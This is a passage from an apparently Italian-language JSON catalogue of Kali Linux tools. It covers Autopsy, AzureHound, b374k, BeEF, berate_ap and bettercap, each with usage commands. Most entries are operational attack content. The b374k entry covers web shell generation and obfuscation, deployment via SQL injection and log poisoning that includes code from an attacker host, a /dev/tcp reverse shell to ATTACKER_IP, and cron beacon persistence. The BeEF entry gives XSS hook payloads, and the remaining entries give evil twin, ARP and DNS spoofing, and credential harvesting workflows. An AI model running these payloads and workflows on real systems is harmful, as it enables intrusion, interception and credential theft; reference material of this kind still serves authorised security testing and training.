vs. rilevanti.</p><p><strong>Keyword Search:</strong> Indicizzazione full-text con Apache Solr, supporta regex, YARA rules, e ricerche su spazio non allocato.</p><p><strong>Reporting:</strong> Genera report HTML, Excel o custom template per documentazione legale con chain of custody.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AVVIO E SETUP ===\n# Avvio interfaccia grafica (Java-based)\nautopsy\n\n# === WORKFLOW TIPICO ===\n# 1. Case > New Case\n#    - Nome caso, numero, investigatore\n#    - Path per database e output\n\n# 2. Add Data Source\n#    - Disk Image (E01, raw, vmdk)\n#    - Local Disk (analisi live con write-blocker)\n#    - Logical Files (cartella o file singoli)\n\n# 3. Configure Ingest Modules\n#    Moduli raccomandati per casi generici:\n#    [x] Recent Activity (browser, download, USB)\n#    [x] Hash Lookup (NSRL per escludere file OS)\n#    [x] File Type Identification (magic bytes)\n#    [x] Extension Mismatch\n#    [x] Keyword Search (con lista custom)\n#    [x] Email Parser\n#    [x] Encryption Detection\n#    [x] PhotoRec Carver\n\n# 4. Analisi risultati\n#    - Views > File Types per categoria\n#    - Results > Extracted Content per artefatti\n#    - Timeline per sequenza eventi\n#    - Keyword Hits per ricerche\n\n# 5. Tagging e Reporting\n#    - Tag file rilevanti per inclusione nel report\n#    - Generate Report > HTML/Excel\n\n# === ANALISI SPECIFICHE ===\n# Trova file cancellati\nViews > Deleted Files\n\n# Analizza Registry\nResults > Extracted Content > Operating System Information\n\n# Timeline eventi\nTools > Timeline\n# Filtra per data range sospetto\n\n# Ricerca keyword custom\nKeyword Search > Add keyword list\n# Importa lista termini investigativi\n\n# === CLI INTEGRATION ===\n# The Sleuth Kit per analisi batch\nfls -r -p image.E01 > file_listing.txt\nicat image.E01 [inode] > extracted_file\ntsk_recover -e image.E01 output_dir/\n\n# === MULTI-USER SETUP ===\n# Server PostgreSQL per casi condivisi\n# Installare PostgreSQL e configurare in\n# Tools > Options > Multi-User</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Standard de facto per <strong>Digital Forensics</strong> in indagini di cybercrime, frode aziendale, e procedimenti penali con accettazione in tribunale.</p><p>In <strong>Incident Response</strong>, analisi di sistemi compromessi per ricostruire TTP dell'attaccante, identificare paziente zero, e timeline dell'intrusione.</p><p>Per <strong>eDiscovery</strong> legale, ricerca di documenti rilevanti in contenziosi civili con export documentato e verificabile.</p><p>In <strong>HR Investigations</strong>, analisi di workstation dipendenti per policy violations (uso improprio, data exfiltration).</p><p>Per <strong>Malware Analysis</strong>, estrazione di artefatti da sistemi infetti per identificare persistenza, C2, lateral movement.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Chain of Custody:</strong> Documentare ogni passo: chi ha acquisito l'immagine, hash di verifica, chi ha accesso al caso. Fondamentale per ammissibilità legale.</p><p><strong>Write Blocking:</strong> MAI collegare dischi originali senza hardware write-blocker. Usare sempre immagini forensi (E01, AFF4).</p><p><strong>Hash Verification:</strong> Verificare hash dell'immagine prima e dopo l'analisi per provare che non è stata modificata.</p><p><strong>Spazio Disco:</strong> Casi grandi richiedono molto spazio. Prevedere 2-3x la dimensione dell'immagine per database e carved files.</p><p><strong>Sensibilità Dati:</strong> I casi contengono dati personali/sensibili. Proteggere accesso al database e output con encryption.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "azurehound",
    "name": "azurehound",
    "version": "2.7.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/azurehound/",
    "desc": "Raccoglie dati da Azure AD per analisi con BloodHound, mappa relazioni e privilegi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>AzureHound</strong> è il collector ufficiale di BloodHound per ambienti Microsoft Azure e Entra ID (ex Azure AD), sviluppato da SpecterOps. Enumera l'intera struttura di identità e permessi del tenant Azure: utenti, gruppi, ruoli directory, App Registration, Service Principal, Managed Identity, e le loro relazioni RBAC su subscription, resource group e risorse individuali. I dati raccolti vengono importati in BloodHound per visualizzare graficamente i percorsi di attacco dal compromesso iniziale fino a Global Admin o Owner delle subscription.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Entra ID Collection:</strong> Enumera utenti, gruppi, ruoli directory (Global Admin, User Admin, ecc.), membership, Conditional Access Policies, e permessi delegati OAuth.</p><p><strong>Azure RM Enumeration:</strong> Mappa subscription, management group, resource group, VM, storage account, Key Vault e i relativi permessi RBAC per identificare chi può controllare cosa.</p><p><strong>Application & Service Principal:</strong> Enumera App Registration con permessi API Graph delegati/application, Service Principal con credenziali, Managed Identity associate a risorse.</p><p><strong>Privilege Escalation Paths:</strong> Identifica permessi pericolosi: Key Vault access, VM Contributor (code exec), Automation Contributor (runbook), Logic Apps (workflow abuse).</p><p><strong>Multiple Auth Methods:</strong> Supporta device code flow (bypass MFA), username/password, token esistente, certificato client, managed identity.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AUTENTICAZIONE ===\n# Device code flow (bypass MFA, richiede interazione utente)\nazurehound -u user@tenant.com\n# Seguire istruzioni per inserire codice su microsoft.com/devicelogin\n\n# Username/password (se no MFA)\nazurehound -u user@tenant.com -p 'Password123!'\n\n# Con access token esistente (da az cli, roadrecon, o token theft)\nazurehound --refresh-token \"0.AXkA...\" -t tenant-id\n\n# Service Principal con certificato (stealth)\nazurehound --cert /path/to/cert.pem --certpass P@ss \\\n  --app-id 00000000-0000-0000-0000-000000000000 --tenant tenant-id\n\n# === COLLECTION ===\n# Collection completa (tutti i dati)\nazurehound -u user@domain.com --output-dir ./azure_data/\n\n# Collection selettiva (riduce rumore e tempo)\nazurehound -u user@domain.com \\\n  --collect users,groups,roles,apps,servicePrincipals \\\n  --output-dir ./azure_data/\n\n# Solo Entra ID (no Azure RM)\nazurehound -u user@domain.com --collect-azuread-only\n\n# Solo Azure RM (no Entra ID)\nazurehound -u user@domain.com --collect-azurerm-only\n\n# === IMPORT IN BLOODHOUND ===\n# BloodHound CE (Community Edition)\nbloodhound-import ./azure_data/*.json\n\n# BloodHound Legacy (4.x)\n# Drag and drop JSON files nell'interfaccia web\n\n# === QUERY POST-IMPORT ===\n# Trova path verso Global Administrator\nMATCH p=shortestPath((n)-[*1..]->(m:AZRole {displayname:\"Global Administrator\"}))\nWHERE n.name =~ '(?i).*'\nRETURN p\n\n# Chi può resettare password di GA?\nMATCH (n)-[:AZResetPassword]->(m:AZUser)-[:AZHasRole]->(r:AZRole {displayname:\"Global Administrator\"})\nRETURN n,m,r\n\n# App con permessi pericolosi\nMATCH (n:AZApp)-[:AZMGAppRoleAssignment_ReadWrite_All]->(m)\nRETURN n,m\n\n# Owner di subscription\nMATCH (n)-[:AZOwner]->(m:AZSubscription)\nRETURN n.name, m.name\n\n# === INTEGRATION ===\n# Combina con ROADtools per analisi dettagliata\nroadrecon auth --device-code\nroadrecon gather\nroadrecon gui  # Visualizzazione alternativa\n\n# Combina con SharpHound per hybrid\nSharpHound.exe -c All\nazurehound -u syncuser@domain.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Cloud Pentesting</strong>, mappa tutti i percorsi di privilege escalation dal compromesso iniziale (phishing, password spray) fino a Global Admin o Owner delle subscription Azure.</p><p>Per <strong>Security Assessment</strong>, identifica permessi eccessivi su App Registration, Service Principal con credenziali non ruotate, e Managed Identity mal configurate.</p><p>In <strong>Hybrid AD Assessment</strong>, complementa SharpHound mappando la parte cloud delle identità sincronizzate con Azure AD Connect.</p><p>Per <strong>Incident Response</strong>, visualizza rapidamente cosa poteva raggiungere un account compromesso nel tenant.</p><p>In <strong>Compliance Review</strong>, documenta la matrice di permessi effettivi per audit SOX, PCI-DSS, SOC2.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging Azure:</strong> Tutte le chiamate Graph API e Azure RM sono loggate in Azure AD Sign-in logs e Activity logs. L'enumerazione massiva è visibile.</p><p><strong>Rilevamento Anomalo:</strong> Azure AD Identity Protection può flaggare comportamento anomalo (molte query in poco tempo).</p><p><strong>Token Scope:</strong> Usare token con scope minimo necessario. Device code flow richiede refresh token con scope ampio.</p><p><strong>Conditional Access:</strong> Alcune policy potrebbero bloccare l'accesso da location/device non riconosciuti.</p><p><strong>Rate Limiting:</strong> Microsoft Graph ha rate limit. Collection di tenant grandi può richiedere ore.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "LDAP_AD"
    ],
    "notes": null
  },
  {
    "id": "b374k",
    "name": "b374k",
    "version": "3.2.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/b374k/",
    "desc": "Web shell PHP con file manager, terminale, DB client e funzioni di rete.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>B374k</strong> è una web shell PHP avanzata e feature-rich per il post-exploitation di server web compromessi. Il nome deriva dal leet speak di 'BREAK'. Una volta caricata su un server vulnerabile, fornisce un'interfaccia web completa per controllare il sistema: file manager grafico con syntax highlighting, terminale interattivo pseudo-TTY, client database multi-engine, tool di rete (port scanner, reverse/bind shell), encoder/decoder, e funzionalità di esfiltrazione. È protetta da password con hashing e supporta compressione/offuscamento per ridurre detection.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>File Manager:</strong> Navigazione filesystem completa con upload (anche chunked per file grandi), download, editing con syntax highlighting, rename, chmod/chown, touch timestamp, operazioni bulk, search ricorsivo.</p><p><strong>Terminal Emulator:</strong> Pseudo-terminale nel browser per esecuzione comandi shell con history, autocomplete path, e supporto per comandi interattivi.</p><p><strong>Database Client:</strong> Supporto MySQL/MariaDB, PostgreSQL, SQLite, Oracle, MSSQL con query editor, export tabelle, gestione struttura.</p><p><strong>Network Tools:</strong> Port scanner, reverse shell (PHP, Perl, Python, Bash), bind shell, client TCP/UDP per tunneling manuale.</p><p><strong>Encoder/Decoder:</strong> Base64, hex, URL encode, ROT13, MD5/SHA hash - utili per data exfil e bypass.</p><p><strong>Process Manager:</strong> Lista processi, kill process, informazioni sistema dettagliate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === GENERAZIONE SHELL ===\n# Shell base con password\nphp b374k.php -p 'MySecretPass' -o shell.php\n\n# Shell offuscata (evade signature base)\nphp b374k.php -p 'MySecretPass' -o shell.php -m  # minified\n\n# Shell compressa con gzip\nphp b374k.php -p 'MySecretPass' -o shell.php -z\n\n# Shell con nome funzione random\nphp b374k.php -p 'MySecretPass' -o shell.php -r\n\n# === DEPLOYMENT ===\n# Upload via vulnerabilità file upload\ncurl -F 'file=@shell.php' http://target.com/upload.php\n\n# Via SQL injection con INTO OUTFILE\nSELECT '<?php include(\"http://attacker/shell.php\");?>' INTO OUTFILE '/var/www/html/x.php'\n\n# Via LFI + Log Poisoning\ncurl -A '<?php include(\"http://attacker/shell.php\");?>' http://target.com/\n\n# === ACCESSO ===\n# Browser: http://target.com/uploads/shell.php\n# Inserire password configurata\n\n# === POST-EXPLOITATION ===\n# Nel terminale della shell:\n\n# Privilege escalation recon\nid; uname -a; cat /etc/passwd; sudo -l\n\n# Reverse shell upgrade a netcat\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n# Dump credenziali web app\ncat /var/www/html/config.php | grep -i pass\n\n# Database dump\nmysqldump -u root -p'found_pass' --all-databases > /tmp/dump.sql\n\n# Persistenza via cron\necho '* * * * * curl http://attacker/beacon.php' >> /var/spool/cron/www-data</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Web Exploitation</strong>, dopo aver ottenuto capacità di upload PHP (unrestricted file upload, RCE), b374k fornisce interfaccia completa per privilege escalation e lateral movement.</p><p>Per <strong>CTF Web Challenges</strong>, accelera l'interazione con server compromessi rispetto a reverse shell CLI.</p><p>In <strong>Red Team</strong>, permette persistenza web-based discreta (se offuscata) con accesso via browser normale.</p><p>Per <strong>Pentesting Report</strong>, le funzionalità integrate permettono di documentare rapidamente l'impatto (dump DB, file sensibili).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signature Detection:</strong> B374k è pesantemente firmato da AV, WAF (ModSecurity), e file integrity monitoring. La versione stock viene rilevata immediatamente.</p><p><strong>Offuscamento:</strong> Usare -m -z -r insieme. Per evasion seria, riscrivere parti del codice o usare encoder custom (ionCube, Zend Guard crackati).</p><p><strong>Artefatti Forensi:</strong> Il file PHP su disco è evidenza immediata. Considerare web shell memory-only o inclusione remota.</p><p><strong>Logging Web Server:</strong> Ogni accesso alla shell appare nei log Apache/Nginx. Usare User-Agent credibile e considerare log rotation.</p><p><strong>Autorizzazione:</strong> L'uso non autorizzato di web shell è reato penale (accesso abusivo a sistema informatico).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "beef-xss",
    "name": "beef-xss",
    "version": "0.5.4.0",
    "icon": "../app/icons/beef-xss-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/beef-xss/",
    "desc": "Framework per sfruttare XSS: hooking browser, keylogging, phishing, pivoting client-side.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>BeEF (Browser Exploitation Framework) è il framework di riferimento per trasformare vulnerabilità XSS in vettori di attacco completi. Una volta che la vittima esegue l'hook JavaScript (pochi KB), il suo browser diventa uno 'zombie' controllabile remotamente tramite pannello web. BeEF offre oltre 300 moduli per information gathering (fingerprint, IP interno via WebRTC, geolocation), credential theft (fake login, keylogger), social engineering (fake updates, clipboard hijack), exploitation (browser CVE, BeEF bind), e network reconnaissance (port scan interno, ping sweep). Il browser vittima diventa un pivot nella rete interna.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Browser Hooking:</strong> hook.js (~30KB) stabilisce websocket persistente con C2, sopravvive a navigazione nella stessa tab grazie a tecniche di persistence (iframes, popunders).</p><p><strong>Information Gathering:</strong> Fingerprint dettagliato: browser/OS, plugin (Flash, Java, Silverlight), internal IP via WebRTC STUN, visited URLs, cookie accessibili, geolocation HTML5.</p><p><strong>Credential Harvesting:</strong> Pretty Theft (fake login overlay), Clippy assistant, Google Phishing, Fake Flash update, form grabber.</p><p><strong>Social Engineering:</strong> Fake notification bars (Chrome, Firefox style), Tabnabbing, clickjacking frames, fake CAPTCHA.</p><p><strong>Network Reconnaissance:</strong> Port scanner JavaScript (timing attack), ping sweep, internal network mapper, fingerprint router admin pages.</p><p><strong>Browser Exploitation:</strong> Moduli per CVE specifiche di browser/plugin, WebRTC exploits, same-origin bypass.</p><p><strong>Persistence:</strong> Man-in-the-Browser via proxy injection, iFrame keylogger, event hooking.</p><p><strong>Tunneling:</strong> Usa il browser come proxy per raggiungere risorse interne (DNS rebinding, XSS tunnel).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AVVIO SERVER ===\n# Avvio BeEF (richiede Ruby)\nsudo beef-xss\n# Oppure da source\ncd /usr/share/beef-xss && ./beef\n\n# Console web: http://127.0.0.1:3000/ui/panel\n# Default: beef:beef (cambiare in config.yaml!)\n\n# === HOOK INJECTION ===\n# XSS Stored/Reflected - iniettare in pagina vulnerabile:\n<script src=\"http://ATTACKER_IP:3000/hook.js\"></script>\n\n# Via XSS con encoding bypass\n<img src=x onerror=\"var s=document.createElement('script');s.src='http://ATTACKER_IP:3000/hook.js';document.body.appendChild(s);\">\n\n# Con jQuery (se presente)\n$.getScript('http://ATTACKER_IP:3000/hook.js')\n\n# === CONFIGURAZIONE AVANZATA ===\n# config.yaml - cambio porta e credenziali\nbeef:\n  credentials:\n    user: \"admin\"\n    passwd: \"ComplexP@ss!\"\n  http:\n    port: 8080\n    public: \"attacker.com\"  # Per NAT/tunnel\n\n# Abilita moduli aggiuntivi\nextensions:\n  metasploit:\n    enable: true\n    host: \"127.0.0.1\"\n    port: 55552\n\n# === WORKFLOW POST-HOOK ===\n# 1. Browser appare in 'Online Browsers'\n# 2. Click su browser -> Details (fingerprint)\n# 3. Commands -> seleziona categoria\n\n# Moduli essenziali da eseguire:\n# - Browser > Get Cookie\n# - Browser > Get Internal IP (WebRTC)\n# - Host > Get System Info\n# - Network > Port Scanner (internal)\n# - Social Engineering > Pretty Theft (fake Google login)\n\n# === INTEGRAZIONE METASPLOIT ===\n# In msfconsole:\nload msgrpc ServerHost=127.0.0.1 ServerPort=55552 Pass=abc123\n\n# BeEF può ora lanciare exploit MSF direttamente sui browser\n# Commands > Exploits > seleziona exploit\n\n# === PERSISTENZA ===\n# Man-in-the-Browser (modifica tutte le form nella pagina)\nCommands > Persistence > Man-In-The-Browser\n\n# iFrame persistence (sopravvive a navigazione)\nCommands > Persistence > Confirm Close Tab\n\n# === PIVOTING ===\n# Usa browser come proxy per rete interna\n# Network > Internal Network Fingerprinting\n# Network > Cross Origin Scanner (trova API interne)</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Web Pentesting</strong>, dimostra l'impatto reale di XSS oltre alert() - credential theft, session hijacking, lateral movement - per report più convincenti.</p><p>Per <strong>Red Team</strong>, stabilisce persistenza client-side usando browser di dipendenti come pivot per attaccare risorse interne non esposte.</p><p>In <strong>Phishing Campaigns</strong>, i moduli Pretty Theft producono overlay di login indistinguibili dagli originali.</p><p>Per <strong>Security Awareness</strong>, demo dal vivo dell'impatto XSS è più efficace di spiegazioni teoriche.</p><p>In <strong>Bug Bounty</strong>, catture BeEF nei report dimostrano criticità XSS, aumentando severity e payout.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signature Detection:</strong> hook.js è firmato da molti AV web e WAF. Usare obfuscator JS o hosting su dominio trusted.</p><p><strong>CSP Bypass:</strong> Content-Security-Policy blocca script esterni. Verificare header CSP prima. Alcune bypass con JSONP callbacks.</p><p><strong>HTTPS/Mixed Content:</strong> Browser moderni bloccano script HTTP su pagine HTTPS. BeEF deve avere certificato valido.</p><p><strong>Network Detection:</strong> Websocket persistente verso IP sconosciuto è anomalo. Usare domain fronting o tunnel DNS.</p><p><strong>Short-Lived Sessions:</strong> Se vittima chiude tab/browser, connessione persa. Usare persistence modules per estendere.</p><p><strong>Logging:</strong> Tutte le interazioni sono loggate in BeEF. Pulire logs dopo engagement.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "XSS"
    ],
    "notes": null
  },
  {
    "id": "berate-ap",
    "name": "berate-ap",
    "version": "0.4.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/berate-ap/",
    "desc": "Crea access point malevoli per attacchi MITM su reti WiFi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Berate_ap è uno script Python che semplifica la creazione di access point malevoli (Rogue AP / Evil Twin) per attacchi Man-in-the-Middle su reti wireless. Automatizza la configurazione di hostapd (AP daemon), dnsmasq (DHCP/DNS), e iptables (NAT/forwarding) creando un AP funzionante in un singolo comando. Le vittime che si connettono navigano normalmente mentre tutto il traffico transita attraverso l'attaccante, permettendo intercettazione, injection, e credential harvesting. È progettato per integrarsi con tool MITM come mitmproxy, sslstrip, bettercap.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>One-Command Setup:</strong> Configura automaticamente hostapd.conf, dnsmasq.conf, regole iptables NAT, e IP forwarding del kernel.</p><p><strong>Flexible Networking:</strong> Supporta forwarding verso ethernet (eth0), altra WiFi, VPN, o tunnel - qualsiasi interfaccia con connettività.</p><p><strong>Custom SSID/Channel:</strong> Imposta nome rete e canale per impersonare reti esistenti (Evil Twin) o creare hotspot attraenti.</p><p><strong>DHCP Server:</strong> Assegna automaticamente IP alle vittime con DNS controllato (per DNS spoofing).</p><p><strong>Clean Teardown:</strong> Script di cleanup ripristina configurazioni originali alla chiusura.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP BASE ===\n# Crea AP \"FreeWiFi\" su wlan0, forwarding verso eth0\nsudo berate_ap wlan0 eth0 FreeWiFi\n\n# Con canale specifico (deve essere supportato dall'adapter)\nsudo berate_ap --channel 6 wlan0 eth0 CafeWiFi\n\n# === EVIL TWIN ===\n# Prima identifica rete target\nairodump-ng wlan0mon\n# Nota SSID, canale, BSSID\n\n# Crea Evil Twin con stesso nome\nsudo berate_ap --channel 11 wlan0 eth0 \"TargetCompany-Guest\"\n\n# Opzionale: deauth vittime dalla rete reale\nsudo aireplay-ng --deauth 5 -a [TARGET_BSSID] wlan1mon\n\n# === INTEGRAZIONE MITM ===\n# Avvia berate_ap, poi in altro terminale:\n\n# Con mitmproxy (HTTPS interception)\nmitmproxy -T --host\n# Configura iptables per redirect a mitmproxy\nsudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080\nsudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080\n\n# Con sslstrip (downgrade HTTPS)\nsslstrip -l 8080\nsudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080\n\n# Con bettercap (all-in-one)\nsudo bettercap -iface wlan0 -caplet hstshijack/hstshijack\n\n# Con Wireshark (passive sniffing)\nwireshark -i wlan0 -k\n\n# === CAPTIVE PORTAL ===\n# Redirige tutto il traffico HTTP a pagina di phishing\nsudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 80\npython3 -m http.server 80  # Serve phishing page\n\n# === WORKFLOW COMPLETO CREDENTIAL HARVEST ===\n# Terminal 1: AP\nsudo berate_ap wlan0 eth0 \"Free_Airport_WiFi\"\n\n# Terminal 2: Credential sniffer\nsudo tcpdump -i wlan0 -w capture.pcap\n# Oppure\nsudo bettercap -iface wlan0 -eval \"net.sniff on; set net.sniff.local true\"\n\n# Terminal 3: DNS Spoof (opzionale)\nsudo bettercap -iface wlan0 -eval \"set dns.spoof.domains *.facebook.com; dns.spoof on\"\n\n# Post-capture: estrai credenziali\nstrings capture.pcap | grep -i 'pass\\|user\\|login'\n# Oppure PCredz per parsing automatico</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Wireless Pentesting</strong>, crea rapidamente Evil Twin per testare se dipendenti si connettono a reti non verificate e inseriscono credenziali.</p><p>Per <strong>Red Team</strong> in luoghi pubblici (caffè, aeroporti, hotel), intercetta credenziali di utenti che cercano WiFi gratuito.</p><p>In <strong>Security Awareness Training</strong>, demo dal vivo di quanto sia pericoloso connettersi a WiFi sconosciuti.</p><p>Per <strong>Rogue AP Detection Testing</strong>, verifica se WIDS/WIPS aziendali rilevano e alertano su AP malevoli.</p><p>In <strong>Captive Portal Testing</strong>, simula hotspot con pagina di login per valutare comportamento utenti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità:</strong> Creare AP malevoli e intercettare traffico è reato penale (intercettazione comunicazioni, frode informatica) senza autorizzazione esplicita scritta.</p><p><strong>Detection WIDS:</strong> Sistemi WIPS enterprise rilevano Evil Twin (stesso SSID, BSSID diverso) e possono localizzare l'attaccante.</p><p><strong>HSTS:</strong> Browser moderni con HSTS non permettono downgrade HTTPS per siti visitati precedentemente. sslstrip inefficace su siti principali.</p><p><strong>Certificate Warnings:</strong> HTTPS interception genera warning certificato. Utenti attenti non procederanno.</p><p><strong>Hardware:</strong> Non tutti gli adapter WiFi supportano AP mode. Verificare con 'iw list' (AP nella lista modes).</p><p><strong>Interferenza:</strong> AP sullo stesso canale della rete target crea interferenza rilevabile. Considerare canali adiacenti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "bettercap",
    "name": "bettercap",
    "version": "2.33.0",
    "icon": "../app/icons/bettercap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bettercap/",
    "desc": "Swiss army knife per attacchi di rete: MITM, ARP spoof, WiFi, BLE, HID injection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Bettercap</strong> è il framework MITM più completo e moderno, sviluppato da evilsocket come successore spirituale di ettercap. Scritto in Go per performance e portabilità, supporta attacchi su reti Ethernet (ARP/DNS/DHCP spoofing), WiFi (monitor mode, deauth, handshake capture, PMKID, evil twin), Bluetooth Low Energy (enum, read/write characteristics), e dispositivi HID (keystroke injection). Include interfaccia web interattiva real-time, scripting JavaScript per proxy manipulation, e caplets (script di automazione) per workflow complessi. È lo standard de facto per network security assessment.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Network MITM:</strong> ARP spoofing (half/full duplex), DNS spoofing con wildcard, DHCP spoofing, NDP spoofing (IPv6). Sniffer integrato per HTTP, FTP, IMAP, SMTP, NTLM, Kerberos.</p><p><strong>HTTP(S) Proxy:</strong> Transparent proxy con JS injection, content manipulation, SSLstrip 2.0 (hstshijack caplet per HSTS bypass).</p><p><strong>WiFi Module:</strong> Monitor mode, client/AP discovery, deauthentication, handshake capture automatico, PMKID attack, evil twin AP integrato.</p><p><strong>BLE Module:</strong> Scansione dispositivi, enumeration services/characteristics, read/write values - completo testing IoT.</p><p><strong>HID Module:</strong> Keystroke injection via dispositivi HID compatibili (Rubber Ducky style).</p><p><strong>Caplets:</strong> Script di automazione che combinano comandi multipli. Repository ufficiale con caplet pronti all'uso.</p><p><strong>Web UI:</strong> Interfaccia grafica real-time per monitoring, controllo moduli, visualizzazione traffico.</p><p><strong>API REST:</strong> Controllo programmato via API per integrazione con altri tool.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AVVIO E INTERFACCE ===\n# Interactive mode\nsudo bettercap -iface eth0\n\n# Con Web UI\nsudo bettercap -iface eth0 -caplet http-ui\n# Browser: http://127.0.0.1:80 (user:pass)\n\n# === NETWORK MITM ===\n# Discovery attivo della rete\nnet.probe on\nnet.show\n\n# ARP spoof completo della subnet\nset arp.spoof.fullduplex true\nset arp.spoof.targets 192.168.1.0/24\narp.spoof on\nnet.sniff on\n\n# ARP spoof target specifico + gateway\nset arp.spoof.targets 192.168.1.50\nset arp.spoof.internal false\narp.spoof on\n\n# === DNS SPOOFING ===\nset dns.spoof.domains *.microsoft.com,*.office.com\nset dns.spoof.address 10.0.0.5  # IP del phishing server\ndns.spoof on\n\n# === HTTPS INTERCEPTION ===\n# hstshijack bypassa HSTS per molti siti\nsudo bettercap -iface eth0 -caplet hstshijack/hstshijack\n\n# Proxy con JS injection custom\nset http.proxy.script /path/to/inject.js\nset https.proxy.script /path/to/inject.js\nhttp.proxy on\nhttps.proxy on\n\n# inject.js esempio:\n# function onResponse(req, res) {\n#   if(res.ContentType.indexOf('text/html') == 0) {\n#     res.Body = res.Body.replace('</head>', '<script>alert(1)</script></head>');\n#   }\n# }\n\n# === WIFI ATTACKS ===\n# Metti interfaccia in monitor (se non già)\nwifi.recon on\nwifi.show  # Lista AP e clients\n\n# Deauth target per catturare handshake\nwifi.deauth AA:BB:CC:DD:EE:FF\n\n# PMKID attack (no client necessario)\nwifi.assoc AA:BB:CC:DD:EE:FF\n\n# Evil Twin integrato\nwifi.ap on\n\n# === BLE ATTACKS ===\nble.recon on\nble.show  # Lista dispositivi BLE\n\n# Enumera servizi\nble.enum AA:BB:CC:DD:EE:FF\n\n# Leggi/scrivi caratteristica\nble.write AA:BB:CC:DD:EE:FF [UUID] [HEX_DATA]\n\n# === CAPLETS UTILI ===\n# Credential sniffing completo\nsudo bettercap -caplet local-sniffer.cap\n\n# HTTP/HTTPS interception con log\nsudo bettercap -caplet https-ui.cap\n\n# Autopwn: discovery + arp spoof + sniff automatico\nsudo bettercap -caplet autopwn.cap\n\n# === AUTOMAZIONE CUSTOM ===\ncat > mitm.cap << 'EOF'\nnet.probe on\nsleep 5\nset arp.spoof.fullduplex true\nset arp.spoof.targets 192.168.1.0/24\narp.spoof on\nset net.sniff.verbose true\nset net.sniff.filter \"host 192.168.1.50\"\nnet.sniff on\nEOF\nsudo bettercap -caplet mitm.cap\n\n# === CREDENTIAL EXTRACTION ===\n# Le credenziali catturate appaiono in real-time\n# Per salvare:\nevents.stream off\nset events.stream.output /tmp/creds.log\nevents.stream on</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Network Pentesting</strong>, è lo strumento primario per MITM, credential harvesting, e traffic manipulation su reti switched.</p><p>Per <strong>Wireless Assessment</strong>, combina discovery, deauth, handshake capture e cracking in un unico framework.</p><p>In <strong>IoT Security</strong>, il modulo BLE permette testing completo di dispositivi smart home, wearables, beacon.</p><p>Per <strong>Red Team</strong>, i caplets automatizzano catene di attacco complesse riproducibili.</p><p>In <strong>Security Research</strong>, l'API REST permette integrazione con tool custom per automazione avanzata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>ARP Detection:</strong> ARP spoofing è facilmente rilevabile da arpwatch, IDS (Snort, Suricata), switch con DAI. Il pattern di traffico è distintivo.</p><p><strong>HSTS Limitations:</strong> hstshijack funziona solo su siti non pre-loaded in browser HSTS list. Google, Facebook, Twitter sono immune.</p><p><strong>802.1X:</strong> Reti con 802.1X (port authentication) limitano la capacità di spoofing - serve autenticazione valida prima.</p><p><strong>WiFi Detection:</strong> Deauth frames sono rilevabili da WIDS. Alcuni AP hanno protezione anti-deauth.</p><p><strong>Logging:</strong> Bettercap logga tutto localmente. Pulire 